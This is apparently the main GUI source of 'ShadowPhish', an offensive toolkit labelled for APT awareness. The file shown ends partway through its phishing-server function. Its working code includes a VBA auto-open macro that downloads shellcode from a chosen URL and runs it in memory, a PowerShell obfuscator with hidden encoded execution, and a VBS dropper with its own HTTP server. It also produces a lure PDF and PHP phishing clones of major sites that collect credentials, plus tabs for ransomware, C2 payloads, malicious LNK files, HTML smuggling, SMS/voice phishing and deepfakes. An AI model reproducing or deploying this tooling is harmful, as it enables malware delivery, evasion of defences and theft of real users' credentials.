from PySide2.QtWidgets import (
    QApplication, QMainWindow, QWidget, QTabWidget, QVBoxLayout, QLabel,
    QComboBox, QPushButton, QLineEdit, QTextEdit, QMessageBox, QCheckBox, QFileDialog
)
from PySide2.QtGui import QPixmap
from PySide2.QtWidgets import QLabel
from PySide2.QtGui import QPalette, QColor
from PySide2.QtCore import Qt, QTimer
import sys
import os
import subprocess
import threading
import socket

# Ensure the root directory is in the system path
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from frontend.splash_screen import ShadowPhishSplash



class DarkThemeApp(QMainWindow):
    def __init__(self, lang_code="en-us", translations=None):
        super().__init__()
        self.lang = lang_code
        self.translations = translations or {}
        self.face_image_path = ""
        self.target_video_path = ""
        self.setWindowTitle("ShadowPhish - APT Awareness Toolkit")
        self.setGeometry(100, 100, 1000, 700)

        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)

        self.create_tabs()
        self.set_dark_theme()

    def create_tabs(self):
        self.artifacts_tab = QWidget()
        self.phishing_tab = QWidget()
        self.deepfake_tab = QWidget()
        self.c2_tab = QWidget()
        self.apt_tab = QWidget()
        self.gsm_tab = QWidget()
        self.lnk_tab = QWidget()
        self.htmlsm_tab = QWidget()
        self.ransomware_tab = QWidget()
        self.decryptor_tab = QWidget()
        self.qrcode_tab = QWidget()

        self.tabs.addTab(self.artifacts_tab, "Generate Malicious Artifacts")
        self.tabs.addTab(self.phishing_tab, "Phishing and Spear-Phishing")
        self.tabs.addTab(self.deepfake_tab, "Deepfake and Deepvoice Awareness")
        self.tabs.addTab(self.c2_tab, "Simulated C2")
        self.tabs.addTab(self.gsm_tab, "Smishing and Vishing")
        self.tabs.addTab(self.apt_tab, "APT Templates")
        self.tabs.addTab(self.ransomware_tab, "Ransomware Simulator")
        self.tabs.addTab(self.decryptor_tab, "Decrypt Ransomware")
        self.tabs.addTab(self.qrcode_tab, "QR Code Phishing")

        # --- Tab Generate Malicious Artifacts ---
        layout = QVBoxLayout()

        # Malicious PDF
        layout.addWidget(QLabel("Add URL for Malicious PDF:"))
        self.pdf_input = QTextEdit()
        layout.addWidget(self.pdf_input)
        self.pdf_btn = QPushButton("Generate PDF")
        self.pdf_btn.clicked.connect(self.generate_pdf)
        layout.addWidget(self.pdf_btn)

        # Word Macro
        layout.addWidget(QLabel("VBA Code for Word Macro:"))
        self.macro_input = QTextEdit()
        layout.addWidget(self.macro_input)
        self.macro_btn = QPushButton("Generate DOCX with Macro")
        self.fill_macro_btn = QPushButton("Fill Default Macro")
        self.fill_macro_btn.clicked.connect(self.fill_macro_template)
        layout.addWidget(self.fill_macro_btn)
        self.macro_btn.clicked.connect(self.generate_macro)
        layout.addWidget(self.macro_btn)

        # PowerShell with evasion options
        layout.addWidget(QLabel("PowerShell Payload:"))
        self.ps_input = QTextEdit()
        layout.addWidget(self.ps_input)

        self.ps_base64_checkbox = QCheckBox("Encode in Base64")
        self.ps_varsub_checkbox = QCheckBox("Variable Substitution")
        self.ps_concat_checkbox = QCheckBox("String Concatenation")
        self.ps_iex_checkbox = QCheckBox("Use IEX")
        self.ps_compress_checkbox = QCheckBox("Compression + Decompression")

        layout.addWidget(self.ps_base64_checkbox)
        layout.addWidget(self.ps_varsub_checkbox)
        layout.addWidget(self.ps_concat_checkbox)
        layout.addWidget(self.ps_iex_checkbox)
        layout.addWidget(self.ps_compress_checkbox)

        self.ps_btn = QPushButton("Generate PS1")
        self.ps_btn.clicked.connect(self.generate_ps1)
        layout.addWidget(self.ps_btn)

        # VBS with remote shellcode
        self.vbs_remote_btn = QPushButton("Generate Remote VBS + Start Server")
        self.vbs_remote_btn.clicked.connect(self.generate_vbs_remote)
        layout.addWidget(self.vbs_remote_btn)

        self.artifacts_tab.setLayout(layout)

        # --- Tab Phishing & Spear-Phishing ---
        phishing_layout = QVBoxLayout()

        # Prebuilt phishing pages
        self.site_selector = QComboBox()
        self.site_selector.addItems([
            "Facebook", "Instagram", "Google", "Microsoft", "Netflix", "Paypal", "Steam", "Twitter", "Playstation",
            "Tiktok", "Mediafire", "Twitch", "Pinterest", "Snapchat", "Linkedin", "Ebay", "Quora", "Protonmail",
            "Spotify", "Reddit", "Adobe", "Gitlab", "DeviantArt", "Badoo", "Origin", "DropBox", "Yahoo",
            "Wordpress", "Yandex", "StackoverFlow", "Vk", "XBOX", "Github"
        ])
        phishing_layout.addWidget(self.site_selector)

        self.launch_phish_btn = QPushButton("Launch Phishing Site")
        self.launch_phish_btn.clicked.connect(self.start_phish_server)
        phishing_layout.addWidget(self.launch_phish_btn)

        self.phish_url_label = QLabel("Phishing URL will appear here...")
        phishing_layout.addWidget(self.phish_url_label)

        phishing_layout.addWidget(QLabel("Collected Credentials:"))
        self.creds_output = QTextEdit()
        self.creds_output.setReadOnly(True)
        phishing_layout.addWidget(self.creds_output)

        self.phishing_tab.setLayout(phishing_layout)

        # --- Fake Recaptcha (Pastejack) ---
        phishing_layout.addWidget(QLabel("Generate Fake Recaptcha with Auto CTRL+C:"))
        self.recaptcha_btn = QPushButton("Generate Fake Recaptcha")
        self.recaptcha_btn.clicked.connect(self.generate_fake_recaptcha)
        phishing_layout.addWidget(self.recaptcha_btn)

        self.phishing_tab.setLayout(phishing_layout)

        # --- Tab Deepfake & Deepvoice Awareness ---
        deepfake_layout = QVBoxLayout()

        # Deepfake Video
        deepfake_layout.addWidget(QLabel("Generate Face Swap Video (Deepfake):"))

        self.source_img_btn = QPushButton("Select Face Image (Source)")
        self.source_img_btn.clicked.connect(self.select_face_image)
        deepfake_layout.addWidget(self.source_img_btn)

        self.target_video_btn = QPushButton("Select Target Video (with Face)")
        self.target_video_btn.clicked.connect(self.select_target_video)
        deepfake_layout.addWidget(self.target_video_btn)

        self.run_deepfake_btn = QPushButton("Start Deepfake with FaceFusion")
        self.run_deepfake_btn.clicked.connect(self.run_deepfake_generator)
        deepfake_layout.addWidget(self.run_deepfake_btn)

        self.deepfake_status = QLabel("No deepfake generated yet.")
        deepfake_layout.addWidget(self.deepfake_status)

        self.run_deepfake_btn = QPushButton("Start Deepfake")
        self.run_deepfake_btn.clicked.connect(self.run_deepfake_generator)
        deepfake_layout.addWidget(self.run_deepfake_btn)

        self.deepfake_status = QLabel("No video processed yet.")
        deepfake_layout.addWidget(self.deepfake_status)

        # Deep Voice
        deepfake_layout.addWidget(QLabel("Generate Cloned Voice (DeepVoice):"))
        self.voice_input = QTextEdit()
        deepfake_layout.addWidget(self.voice_input)

        self.voice_selector = QComboBox()
        self.voice_selector.addItems(["Obama", "Elon Musk", "Generic", "Trained"])
        deepfake_layout.addWidget(self.voice_selector)

        self.voice_btn = QPushButton("Generate Cloned Voice")
        self.voice_btn.clicked.connect(self.generate_deepvoice_audio)
        deepfake_layout.addWidget(self.voice_btn)

        self.deepvoice_status = QLabel("No audio generated yet.")
        deepfake_layout.addWidget(self.deepvoice_status)

        self.deepfake_tab.setLayout(deepfake_layout)


        # System type selection
        c2_layout = QVBoxLayout()
        self.c2_os_selector = QComboBox()
        self.c2_os_selector.addItems(["Windows", "Linux", "macOS"])
        self.c2_os_selector.setToolTip("Type of payload/target system")
        c2_layout.addWidget(QLabel("Target Operating System:"))
        c2_layout.addWidget(self.c2_os_selector)

        # Platform selector
        self.c2_platform_selector = QComboBox()
        self.c2_platform_selector.addItems(["Windows", "Linux", "macOS"])
        self.c2_platform_selector.setCurrentText("Windows")
        c2_layout.addWidget(QLabel("Select Payload Platform:"))
        c2_layout.addWidget(self.c2_platform_selector)

        # IP and Port Inputs
        self.c2_ip_input = QLineEdit()
        self.c2_ip_input.setPlaceholderText("Listener IP (e.g., 127.0.0.1)")
        c2_layout.addWidget(self.c2_ip_input)

        self.c2_port_input = QLineEdit()
        self.c2_port_input.setPlaceholderText("Port (e.g., 4444)")
        c2_layout.addWidget(self.c2_port_input)

        # Payload generation button
        self.generate_payload_btn = QPushButton("Generate Payload and Compile")
        self.generate_payload_btn.clicked.connect(self.generate_c2_payload)
        c2_layout.addWidget(self.generate_payload_btn)

        # Output terminal
        self.c2_terminal = QTextEdit()
        self.c2_terminal.setReadOnly(True)
        c2_layout.addWidget(self.c2_terminal)

        # Quick commands
        self.cmd_buttons = []
        self.cmds_container = QWidget()
        self.cmds_layout = QVBoxLayout()
        self.cmds_container.setLayout(self.cmds_layout)
        c2_layout.addWidget(self.cmds_container)

        # Manual command input
        self.manual_cmd = QLineEdit()
        self.manual_cmd.setPlaceholderText("Enter a manual command...")
        c2_layout.addWidget(self.manual_cmd)

        self.send_cmd_btn = QPushButton("Send Command")
        self.send_cmd_btn.clicked.connect(lambda: self.send_c2_command(self.manual_cmd.text()))
        c2_layout.addWidget(self.send_cmd_btn)

        self.c2_tab.setLayout(c2_layout)

        # Socket and payload section
        self.listener_socket = None
        self.client_socket = None

        # APT selector

        apt_layout = QVBoxLayout()

        apt_layout.addWidget(QLabel("Select APT Group:"))
        self.apt_selector = QComboBox()
        self.apt_selector.addItems(["APT29", "FIN7", "APT41"])
        apt_layout.addWidget(self.apt_selector)

        # Button to generate template
        self.generate_apt_btn = QPushButton("Generate Attack Chain")
        self.generate_apt_btn.clicked.connect(self.generate_apt_chain)
        apt_layout.addWidget(self.generate_apt_btn)

        # Template visualization
        self.apt_output = QTextEdit()
        self.apt_output.setReadOnly(True)
        apt_layout.addWidget(self.apt_output)

        # Status
        self.apt_status = QLabel("Status: Waiting for selection.")
        apt_layout.addWidget(self.apt_status)

        self.apt_tab.setLayout(apt_layout)

        # GSM Layout
        gsm_layout = QVBoxLayout()
        gsm_layout.addWidget(QLabel("Target Number (with country code):"))
        self.gsm_number_input = QLineEdit()
        self.gsm_number_input.setPlaceholderText("+5511999999999")
        gsm_layout.addWidget(self.gsm_number_input)

        # Choose type: Smishing or Vishing
        self.gsm_type_selector = QComboBox()
        self.gsm_type_selector.addItems(["Smishing (SMS)", "Vishing (Call)"])
        gsm_layout.addWidget(QLabel("Delivery Type:"))
        gsm_layout.addWidget(self.gsm_type_selector)

        # --- Twilio Authentication ---
        gsm_layout.addWidget(QLabel("Twilio Account SID:"))
        self.twilio_sid_input = QLineEdit()
        gsm_layout.addWidget(self.twilio_sid_input)

        gsm_layout.addWidget(QLabel("Twilio Auth Token:"))
        self.twilio_token_input = QLineEdit()
        self.twilio_token_input.setEchoMode(QLineEdit.Password)
        gsm_layout.addWidget(self.twilio_token_input)

        gsm_layout.addWidget(QLabel("Sender Number (From):"))
        self.twilio_from_input = QLineEdit()
        self.twilio_from_input.setPlaceholderText("+15017122661")
        gsm_layout.addWidget(self.twilio_from_input)

        # SMS message body
        gsm_layout.addWidget(QLabel("SMS Message Body:"))
        self.gsm_msg_input = QTextEdit()
        gsm_layout.addWidget(self.gsm_msg_input)

        # Audio upload
        gsm_layout.addWidget(QLabel("Audio for Call (URL or local upload):"))
        self.gsm_audio_path = QLineEdit()
        self.gsm_audio_path.setPlaceholderText("https://domain.com/audio.mp3 or choose below")
        gsm_layout.addWidget(self.gsm_audio_path)

        self.gsm_audio_browse = QPushButton("Select Audio File")
        self.gsm_audio_browse.clicked.connect(self.select_audio_file)
        gsm_layout.addWidget(self.gsm_audio_browse)

        # Send button
        self.gsm_send_btn = QPushButton("Send")
        self.gsm_send_btn.clicked.connect(self.send_gsm_action)
        gsm_layout.addWidget(self.gsm_send_btn)

        self.gsm_status = QLabel("Status: Waiting for action...")
        gsm_layout.addWidget(self.gsm_status)

        self.gsm_tab.setLayout(gsm_layout)

        # LNK Generator

        self.lnk_tab = QWidget()
        self.tabs.addTab(self.lnk_tab, "Malicious LNK Generator")

        lnk_layout = QVBoxLayout()

        lnk_layout.addWidget(QLabel("Path to Executable or Script (Payload):"))
        self.lnk_payload_input = QLineEdit()
        lnk_layout.addWidget(self.lnk_payload_input)

        lnk_layout.addWidget(QLabel("Shortcut Name (.lnk):"))
        self.lnk_name_input = QLineEdit()
        self.lnk_name_input.setPlaceholderText("example.lnk")
        lnk_layout.addWidget(self.lnk_name_input)

        lnk_layout.addWidget(QLabel("Custom Icon (optional):"))
        self.lnk_icon_input = QLineEdit()
        lnk_layout.addWidget(self.lnk_icon_input)

        self.lnk_icon_browse = QPushButton("Select Icon (.ico)")
        self.lnk_icon_browse.clicked.connect(self.select_icon_file)
        lnk_layout.addWidget(self.lnk_icon_browse)

        lnk_layout.addWidget(QLabel("Save Location for Shortcut:"))
        self.lnk_output_dir = QLineEdit()
        lnk_layout.addWidget(self.lnk_output_dir)

        self.lnk_dir_browse = QPushButton("Select Output Folder")
        self.lnk_dir_browse.clicked.connect(self.select_output_folder)
        lnk_layout.addWidget(self.lnk_dir_browse)

        self.lnk_hidden_checkbox = QCheckBox("Run in hidden mode")
        lnk_layout.addWidget(self.lnk_hidden_checkbox)

        self.lnk_generate_btn = QPushButton("Generate Malicious Shortcut")
        self.lnk_generate_btn.clicked.connect(self.generate_lnk_malware)
        lnk_layout.addWidget(self.lnk_generate_btn)

        self.lnk_status = QLabel("Status: Waiting for action...")
        lnk_layout.addWidget(self.lnk_status)

        self.lnk_tab.setLayout(lnk_layout)

        # --- HTML Smuggling Tab ---
        self.htmlsm_tab = QWidget()
        self.tabs.addTab(self.htmlsm_tab, "HTML Smuggling")

        htmlsm_layout = QVBoxLayout()

        htmlsm_layout.addWidget(QLabel("Select File to Embed (will be converted to Base64):"))
        self.htmlsm_file_input = QLineEdit()
        htmlsm_layout.addWidget(self.htmlsm_file_input)

        self.htmlsm_browse_btn = QPushButton("Select File")
        self.htmlsm_browse_btn.clicked.connect(self.select_htmlsm_file)
        htmlsm_layout.addWidget(self.htmlsm_browse_btn)

        htmlsm_layout.addWidget(QLabel("Image URL (optional):"))
        self.htmlsm_image_url = QLineEdit()
        self.htmlsm_image_url.setPlaceholderText("https://example.com/image.jpg")
        htmlsm_layout.addWidget(self.htmlsm_image_url)

        htmlsm_layout.addWidget(QLabel("Download Filename:"))
        self.htmlsm_output_filename = QLineEdit()
        self.htmlsm_output_filename.setText("malicious_file.iso")
        htmlsm_layout.addWidget(self.htmlsm_output_filename)

        self.htmlsm_generate_btn = QPushButton("Generate HTML Smuggling")
        self.htmlsm_generate_btn.clicked.connect(self.generate_htmlsm)
        htmlsm_layout.addWidget(self.htmlsm_generate_btn)

        htmlsm_layout.addWidget(QLabel("Delivery Mode:"))
        self.htmlsm_mode_selector = QComboBox()
        self.htmlsm_mode_selector.addItems(["Click on Image", "Automatic Download"])
        htmlsm_layout.addWidget(self.htmlsm_mode_selector)

        self.htmlsm_status = QLabel("Status: Waiting for action...")
        htmlsm_layout.addWidget(self.htmlsm_status)

        self.htmlsm_open_btn = QPushButton("Open in Browser")
        self.htmlsm_open_btn.setEnabled(False)
        self.htmlsm_open_btn.clicked.connect(self.open_htmlsm_in_browser)
        htmlsm_layout.addWidget(self.htmlsm_open_btn)

        self.htmlsm_tab.setLayout(htmlsm_layout)


        # --- Ransomware Simulator Tab ---
        ransom_layout = QVBoxLayout()

        ransom_layout.addWidget(QLabel("Ransomware Name:"))
        self.ransomware_name_input = QLineEdit()
        self.ransomware_name_input.setPlaceholderText("E.g.: SimRansom")
        ransom_layout.addWidget(self.ransomware_name_input)

        ransom_layout.addWidget(QLabel("Key (free text, used for RC4/XOR):"))
        self.ransomware_key_input = QLineEdit()
        self.ransomware_key_input.setPlaceholderText("E.g.: TopSecret123")
        ransom_layout.addWidget(self.ransomware_key_input)

        ransom_layout.addWidget(QLabel("Cipher for simulation:"))
        self.ransomware_cipher_selector = QComboBox()
        self.ransomware_cipher_selector.addItems(["RC4", "XOR"])
        ransom_layout.addWidget(self.ransomware_cipher_selector)

        ransom_layout.addWidget(QLabel("Target Operating System (where the ransomware will run):"))
        self.ransomware_os_selector = QComboBox()
        self.ransomware_os_selector.addItems(["Windows", "Linux"])
        ransom_layout.addWidget(self.ransomware_os_selector)

        self.ransomware_generate_btn = QPushButton("Generate Ransomware Simulator")
        self.ransomware_generate_btn.clicked.connect(self.generate_sim_ransomware)
        ransom_layout.addWidget(self.ransomware_generate_btn)

        self.ransom_status = QLabel("Status: Waiting for generation...")
        ransom_layout.addWidget(self.ransom_status)

        self.ransomware_tab.setLayout(ransom_layout)

        # --- Ransomware Decryptor Tab ---
        decrypt_layout = QVBoxLayout()

        decrypt_layout.addWidget(QLabel("Decryptor Name:"))
        self.decryptor_name_input = QLineEdit()
        decrypt_layout.addWidget(self.decryptor_name_input)

        decrypt_layout.addWidget(QLabel("Key used in the attack (same as ransomware):"))
        self.decryptor_key_input = QLineEdit()
        self.decryptor_key_input.setPlaceholderText("E.g.: TopSecret123")
        decrypt_layout.addWidget(self.decryptor_key_input)

        decrypt_layout.addWidget(QLabel("Cipher used:"))
        self.decryptor_cipher_selector = QComboBox()
        self.decryptor_cipher_selector.addItems(["RC4", "XOR"])
        decrypt_layout.addWidget(self.decryptor_cipher_selector)

        decrypt_layout.addWidget(QLabel("Target Operating System (to compile the decryptor):"))
        self.decryptor_os_selector = QComboBox()
        self.decryptor_os_selector.addItems(["Windows", "Linux"])
        decrypt_layout.addWidget(self.decryptor_os_selector)

        self.decryptor_generate_btn = QPushButton("Generate Decryptor")
        self.decryptor_generate_btn.clicked.connect(self.generate_sim_decryptor)
        decrypt_layout.addWidget(self.decryptor_generate_btn)

        self.decryptor_status = QLabel("Status: Waiting for generation...")
        decrypt_layout.addWidget(self.decryptor_status)

        self.decryptor_tab.setLayout(decrypt_layout)

        # --- QR Code Phishing Tab ---
        qr_layout = QVBoxLayout()

        qr_layout.addWidget(QLabel("Destination URL (phishing page):"))
        self.qr_url_input = QLineEdit()
        self.qr_url_input.setPlaceholderText("E.g.: http://192.168.0.5:8080/login")
        qr_layout.addWidget(self.qr_url_input)

        self.qr_generate_btn = QPushButton("Generate QR Code")
        self.qr_generate_btn.clicked.connect(self.generate_phishing_qrcode)
        qr_layout.addWidget(self.qr_generate_btn)

        self.qr_image_label = QLabel()
        self.qr_image_label.setAlignment(Qt.AlignCenter)
        qr_layout.addWidget(self.qr_image_label)

        self.qr_save_btn = QPushButton("Save QR Code as PNG")
        self.qr_save_btn.setEnabled(False)
        self.qr_save_btn.clicked.connect(self.save_qrcode_image)
        qr_layout.addWidget(self.qr_save_btn)

        self.qrcode_tab.setLayout(qr_layout)


    def set_dark_theme(self):
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(30, 30, 30))
        palette.setColor(QPalette.WindowText, Qt.white)
        palette.setColor(QPalette.Base, QColor(25, 25, 25))
        palette.setColor(QPalette.AlternateBase, QColor(53, 53, 53))
        palette.setColor(QPalette.ToolTipBase, Qt.white)
        palette.setColor(QPalette.ToolTipText, Qt.white)
        palette.setColor(QPalette.Text, Qt.white)
        palette.setColor(QPalette.Button, QColor(45, 45, 45))
        palette.setColor(QPalette.ButtonText, Qt.white)
        palette.setColor(QPalette.BrightText, Qt.red)
        palette.setColor(QPalette.Link, QColor(42, 130, 218))
        palette.setColor(QPalette.Highlight, QColor(42, 130, 218))
        palette.setColor(QPalette.HighlightedText, Qt.black)
        self.setPalette(palette)

     # Placeholders for the buttons — insert your code here when needed
    def generate_pdf(self):
        host = self.pdf_input.toPlainText().strip()
        if not host:
            QMessageBox.warning(self, "Error", "Please enter the URL for the malicious PDF.")
            return

        try:
            filename = "badphish.pdf"
            with open(filename, "w") as file:
                file.write('%PDF-1.7\n\n')
                file.write('1 0 obj\n')
                file.write('  << /Type /Catalog\n')
                file.write('     /Pages 2 0 R\n')
                file.write('  >>\n')
                file.write('endobj\n\n')
                file.write('2 0 obj\n')
                file.write('  << /Type /Pages\n')
                file.write('     /Kids [3 0 R]\n')
                file.write('     /Count 1\n')
                file.write('     /MediaBox [0 0 595 842]\n')
                file.write('  >>\n')
                file.write('endobj\n\n')
                file.write('3 0 obj\n')
                file.write('  << /Type /Page\n')
                file.write('     /Parent 2 0 R\n')
                file.write('     /Resources\n')
                file.write('      << /Font\n')
                file.write('          << /F1\n')
                file.write('              << /Type /Font\n')
                file.write('                 /Subtype /Type1\n')
                file.write('                 /BaseFont /Courier\n')
                file.write('              >>\n')
                file.write('          >>\n')
                file.write('      >>\n')
                file.write('     /Annots [<< /Type /Annot\n')
                file.write('                 /Subtype /Link\n')
                file.write('                 /Open true\n')
                file.write('                 /A 5 0 R\n')
                file.write('                 /H /N\n')
                file.write('                 /Rect [0 0 595 842]\n')
                file.write('              >>]\n')
                file.write('     /Contents [4 0 R]\n')
                file.write('  >>\n')
                file.write('endobj\n\n')
                file.write('4 0 obj\n')
                file.write('  << /Length 67 >>\n')
                file.write('stream\n')
                file.write('  BT\n')
                file.write('    /F1 22 Tf\n')
                file.write('    30 800 Td\n')
                file.write('    (PDF Blocked: \'Click Here\') Tj\n')
                file.write('  ET\n')
                file.write('endstream\n')
                file.write('endobj\n\n')
                file.write('5 0 obj\n')
                file.write('  << /Type /Action\n')
                file.write('     /S /URI\n')
                file.write('     /URI (' + host + '/)\n')
                file.write('  >>\n')
                file.write('endobj\n\n')
                file.write('xref\n')
                file.write('0 6\n')
                file.write('0000000000 65535 f\n')
                file.write('0000000010 00000 n\n')
                file.write('0000000069 00000 n\n')
                file.write('0000000170 00000 n\n')
                file.write('0000000629 00000 n\n')
                file.write('0000000749 00000 n\n')
                file.write('trailer\n')
                file.write('  << /Root 1 0 R\n')
                file.write('     /Size 6\n')
                file.write('  >>\n')
                file.write('startxref\n')
                file.write('854\n')
                file.write('%%EOF\n')

            QMessageBox.information(self, "Success", f"Malicious PDF saved as {filename}!")

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Error generating PDF:\n{str(e)}")

    def fill_macro_template(self):
        from PySide2.QtWidgets import QInputDialog

        url, ok1 = QInputDialog.getText(self, "Shellcode URL", "Enter the shellcode URL:")
        if not ok1 or not url:
            return

        path, ok2 = QInputDialog.getText(self, "Save Path", "Enter the path (e.g., C:\\Users\\Public\\shellcode.bin):")
        if not ok2 or not path:
            return

        vba_code = f'''Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As LongPtr, ByRef lpThreadId As Long) As LongPtr

Sub AutoOpen()
    RunShellcode
End Sub

Sub RunShellcode()
    Dim shellcodePath As String
    shellcodePath = "{path}"
    
    If DownloadFile("{url}/shellcode.bin", shellcodePath) Then
        ExecuteShellcode shellcodePath
    End If
End Sub

Function DownloadFile(URL As String, filePath As String) As Boolean
    Dim objXMLHTTP As Object
    Dim objADOStream As Object
    
    On Error Resume Next
    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
    objXMLHTTP.Open "GET", URL, False
    objXMLHTTP.Send
    
    If objXMLHTTP.Status = 200 Then
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Type = 1
        objADOStream.Open
        objADOStream.Write objXMLHTTP.ResponseBody
        objADOStream.SaveToFile filePath, 2
        objADOStream.Close
        DownloadFile = True
    Else
        DownloadFile = False
    End If

    On Error GoTo 0
    Set objXMLHTTP = Nothing
    Set objADOStream = Nothing
End Function

Sub ExecuteShellcode(filePath As String)
    Dim sc() As Byte
    Dim addr As LongPtr
    
    sc = ReadBinFile(filePath)
    
    If UBound(sc) < 0 Then Exit Sub
    
    addr = VirtualAlloc(0, UBound(sc) + 1, &H1000 Or &H2000, &H40)
    
    RtlMoveMemory addr, sc(0), UBound(sc) + 1
    
    CreateThread 0, 0, addr, 0, 0, 0
End Sub

Function ReadBinFile(filePath As String) As Byte()
    Dim fileNum As Integer
    Dim fileSize As Long
    Dim fileData() As Byte
    
    If Dir(filePath) = "" Then Exit Function
    
    fileNum = FreeFile
    Open filePath For Binary As #fileNum
    fileSize = LOF(fileNum)
    
    If fileSize = 0 Then
        Close #fileNum
        Exit Function
    End If
    
    ReDim fileData(fileSize - 1)
    Get #fileNum, , fileData
    Close #fileNum
    
    ReadBinFile = fileData
End Function'''

        self.macro_input.setPlainText(vba_code)
        QMessageBox.information(self, "Default Macro", "VBA code filled successfully!")

    def generate_macro(self):
        content = self.macro_input.toPlainText().strip()

        if not content:
            QMessageBox.warning(self, "Warning", "The macro field is empty.")
            return

        try:
            filename = "macro_payload.vba"
            with open(filename, "w", encoding="utf-8") as f:
                f.write(content)
            QMessageBox.information(self, "Macro", f"VBA document saved as '{filename}'.")

        except Exception as e:
            QMessageBox.critical(self, "Error", f"An error occurred while saving the file:\n{str(e)}")


    def generate_ps1(self):
        import zlib
        import base64
        import random
        import string

        raw_code = self.ps_input.toPlainText().strip()
        use_b64 = self.ps_base64_checkbox.isChecked()
        use_vars = self.ps_varsub_checkbox.isChecked()
        use_concat = self.ps_concat_checkbox.isChecked()
        use_iex = self.ps_iex_checkbox.isChecked()
        use_compress = self.ps_compress_checkbox.isChecked()

        if not raw_code:
            QMessageBox.warning(self, "Alert", "Please enter a PowerShell script.")
            return

        try:
            result = raw_code

            # Variable substitution
            if use_vars:
                var_name = ''.join(random.choices(string.ascii_letters, k=8))
                result = f"${var_name} = \"{result}\"\n"

                if use_iex:
                    result += f"IEX (${var_name})"
                else:
                    result += f"Invoke-Expression (${var_name})"

            # String concatenation
            if use_concat:
                chunks = [f'"{c}"' for c in raw_code]
                joined = '+'.join(chunks)
                result = f"$cmd = {joined}\n"
                if use_iex:
                    result += "IEX ($cmd)"
                else:
                    result += "Invoke-Expression ($cmd)"

            # Compression and decompression
            if use_compress:
                compressed = zlib.compress(raw_code.encode("utf-8"))
                compressed_b64 = base64.b64encode(compressed).decode("utf-8")
                rand1 = ''.join(random.choices(string.ascii_letters, k=8))
                rand2 = ''.join(random.choices(string.ascii_letters, k=8))
                rand3 = ''.join(random.choices(string.ascii_letters, k=8))
                result = f"""
${rand1} = "{compressed_b64}"
${rand2} = New-Object IO.MemoryStream(,[Convert]::FromBase64String(${rand1}))
${rand3} = New-Object IO.Compression.DeflateStream(${rand2}, [IO.Compression.CompressionMode]::Decompress)
$reader = New-Object IO.StreamReader(${rand3}, [Text.Encoding]::UTF8)
$cmd = $reader.ReadToEnd()
"""
                if use_iex:
                    result += "IEX ($cmd)"
                else:
                    result += "Invoke-Expression ($cmd)"

            # Final Base64 encoding
            if use_b64:
                encoded = base64.b64encode(result.encode("utf-16le")).decode("utf-8")
                result = f"powershell -NoP -NonI -W Hidden -EncodedCommand {encoded}"

            # Save the result
            with open("payload_obfuscated.ps1", "w", encoding="utf-8") as f:
                f.write(result)

            QMessageBox.information(self, "Success", "PowerShell script saved as 'payload_obfuscated.ps1'.")

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Error generating PS1:\n{str(e)}")


    def generate_vbs_remote(self):
        import http.server
        import socketserver
        import threading
        import shutil
        from PySide2.QtWidgets import QInputDialog

        path, _ = QFileDialog.getOpenFileName(self, "Select Shellcode (.bin)", "", "BIN Files (*.bin)")
        if not path:
            return

        # Ask for IP and Port
        ip, ok1 = QInputDialog.getText(self, "Download IP", "Enter the IP to use in the VBS (e.g., 192.168.1.10):")
        if not ok1 or not ip:
            return

        port, ok2 = QInputDialog.getText(self, "Server Port", "Enter the HTTP server port (e.g., 8000):")
        if not ok2 or not port.isdigit():
            return
        port = int(port)

        try:
            # Copy shellcode.bin to the output folder
            os.makedirs("outputs", exist_ok=True)
            bin_dest = os.path.join("outputs", "shellcode.bin")
            shutil.copy(path, bin_dest)

            # Create the VBS dropper
            vbs_code = f"""Set xHttp = CreateObject("MSXML2.XMLHTTP")
xHttp.Open "GET", "http://{ip}:{port}/shellcode.bin", False
xHttp.Send

If xHttp.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write xHttp.ResponseBody
    stream.SaveToFile "C:\\Users\\Public\\shellcode.bin", 2
    stream.Close
End If
"""

            vbs_path = os.path.join("outputs", "dropper.vbs")
            with open(vbs_path, "w", encoding="utf-8") as f:
                f.write(vbs_code)

            # Start the embedded HTTP server to serve the .bin file
            def start_server():
                os.chdir("outputs")
                handler = http.server.SimpleHTTPRequestHandler
                with socketserver.TCPServer(("", port), handler) as httpd:
                    print(f"[*] HTTP server started at http://0.0.0.0:{port}")
                    httpd.serve_forever()

            thread = threading.Thread(target=start_server, daemon=True)
            thread.start()

            QMessageBox.information(self, "Success", f"VBS generated as 'dropper.vbs' and HTTP server running on port {port}.")

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Error generating remote VBS:\n{str(e)}")

    def start_phish_server(self):
        import os
        import subprocess
        import random
        import threading
        import time

        site_name = self.site_selector.currentText().lower()
        site_path = os.path.join(".sites", site_name)

        if not os.path.exists(site_path):
            QMessageBox.critical(self, "Error", f"The template .sites/{site_name} was not found.")
            return

        port = random.randint(8000, 8999)

        try:
            # Start PHP built-in server
            subprocess.Popen(
                ["php", "-S", f"0.0.0.0:{port}"],
                cwd=site_path,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            url = f"http://127.0.0.1:{port}/"
            self.phish_url_label.setText(f"<b>Server Active (PHP):</b> <a href='{url}'>{url}</a>")
            self.phish_url_label.setOpenExternalLinks(True)

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to start PHP server:\n{str(e)}")
            return

        # Start monitoring usernames.txt
        self.cred_path = os.path.join(site_path, "usernames.txt")
        self.last_creds = ""
        self.timer = QTimer()
        self.timer.timeout.connect(self.check_credentials_file)
